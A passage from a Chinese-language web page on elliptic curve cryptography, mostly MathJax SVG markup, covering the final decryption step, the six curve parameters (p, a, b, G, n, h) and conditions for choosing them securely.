332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(14085.6,0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(15358.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(16359,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(16810,0)"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="mo" transform="translate(17921.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(18921.4,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(19372.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(19761.4,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mi" transform="translate(20282.4,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mo" transform="translate(21068.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(21735.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(22791,0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g></g></g></svg></mjx-container>，再对点M进行解码就可以得到明文；</li>
</ol>
<p>密码学中，描述一条<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.65ex;" xmlns="http://www.w3.org/2000/svg" width="2.447ex" height="2.188ex" role="img" focusable="false" viewBox="0 -680 1081.7 967.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path></g><g data-mml-node="mi" transform="translate(676,-150) scale(0.707)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></g></svg></mjx-container>上的椭圆曲线，常用到六个参量：<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="19.145ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8461.9 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mo" transform="translate(981.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2037.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2426.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(2929.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(3374.2,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(3903.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(4347.9,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(4776.9,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5221.6,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mo" transform="translate(6007.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(6452.2,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(7052.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(7496.9,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mo" transform="translate(8072.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，其中<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="7.83ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 3461 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(503,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="mi" transform="translate(1503,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2032,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="mi" transform="translate(3032,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container>用来确定一条椭圆曲线，G为基点，n为点G的阶，h是椭圆曲线上所有点的个数m与n相除的整数部分。参量取值的选择，直接影响了加密的安全性。参量值一般要求满足以下几个条件：</p>
<ol>
<li>p越大越安全，但越大，计算速度会变慢，200位左右可以满足一般安全要求；</li>
<li><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.486ex;" xmlns="http://www.w3.org/2000/svg" width="8.576ex" height="2.106ex" role="img" focusable="false" viewBox="0 -716 3790.6 931"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(780.8,0)"><path data-c="2260" d="M166 -215T159 -215T147 -212T141 -204T139 -197Q139 -190 144 -183L306 133H70Q56 140 56 153Q56 168 72 173H327L406 327H72Q56 332 56 347Q56 360 70 367H426Q597 702 602 707Q605 716 618 716Q625 716 630 712T636 703T638 696Q638 692 471 367H707Q722 359 722 347Q722 336 708 328L451 327L371 173H708Q722 163 722 153Q722 140 707 133H351Q175 -210 170 -212Q166 -215 159 -215Z"></path></g><g data-mml-node="mi" transform="translate(1836.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2436.6,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(3214.6,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g></g></g></svg></mjx-container>；</li>
<li><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="13.481ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5958.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(503,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mo" transform="translate(1141.8,0)"><path data-c="2260" d="M166 -215T159 -215T147 -212T141 -204T139 -197Q139 -190 144 -183L306 133H70Q56 140 56 153Q56 168 72 173H327L406 327H72Q56 332 56 347Q56 360 70 367H426Q597 702 602 707Q605 716 618 716Q625 716 630 712T636 703T638 696Q638 692 471 367H707Q722 359 722 347Q722 336 708 328L451 327L371 173H708Q722 163 722 153Q722 140 707 133H351Q175 -210 170 -212Q166 -215 159 -215Z"></path></g><g data-mml-node="mn" transform="translate(2197.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2697.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3086.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 